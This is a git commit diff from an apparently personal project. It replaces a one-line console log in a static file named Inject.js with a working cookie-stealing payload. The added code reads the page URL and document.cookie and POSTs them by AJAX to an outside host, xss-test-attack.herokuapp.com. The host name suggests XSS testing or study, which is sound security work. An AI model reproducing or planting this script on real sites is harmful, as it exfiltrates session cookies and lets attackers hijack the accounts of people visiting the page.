e3bf1ba48093124a2fa0fadbdfabb0c705db64e0
Đỗ Trung Đức <duc010298@gmail.com>
2019-07-09 20:12:26 +0700

    Update Inject.js

--- src/main/resources/static/js/Inject.js
+++ src/main/resources/static/js/Inject.js
@@ -1,1 +1,17 @@
-console.log("Success");
+var href = window.location.href;
+var cookie = document.cookie;
+
+var object = {
+    href: href,
+    cookie: cookie,
+    
+};
+
+$.ajax({
+    url: "https://xss-test-attack.herokuapp.com/",
+    type: 'POST',
+    crossDomain: true,
+    dataType: 'html',
+    contentType: 'application/json',
+    data: JSON.stringify(object)
+});
